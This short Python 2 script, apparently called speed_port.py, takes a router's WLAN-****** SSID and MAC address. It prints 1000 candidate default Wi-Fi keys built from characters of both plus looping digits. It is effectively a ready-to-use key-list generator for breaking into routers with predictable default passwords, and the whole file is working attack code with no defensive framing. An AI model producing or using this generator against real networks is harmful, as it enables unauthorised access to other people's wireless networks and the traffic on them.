#!/usr/bin/python2
import sys
  
def main(argv):
    if(len(argv) != 3):
        help()
        sys.exit(1)

    ssid, mac = argv[1], argv[2]
    mac = str.upper(mac).replace(':',"")
    for X in range(0, 10):
   	for Y in range(0, 10):
	    for Z in range (0, 10):
                print ssid[9]+str(Z)+ ssid[10]+str(ord(mac[8]))+str(ord(mac[9]))+str(ord(mac[10]))+str(X)+str(Y)+str(Z)+str(ord(ssid[6]))+ str(ord(ssid[7]))

def help():
    print "usage: speed_port.py ssid mac"
    print " ssid : WLAN-******"
    print " mac  : **:**:**:**:**:**"

if __name__ == "__main__":
    main(sys.argv)

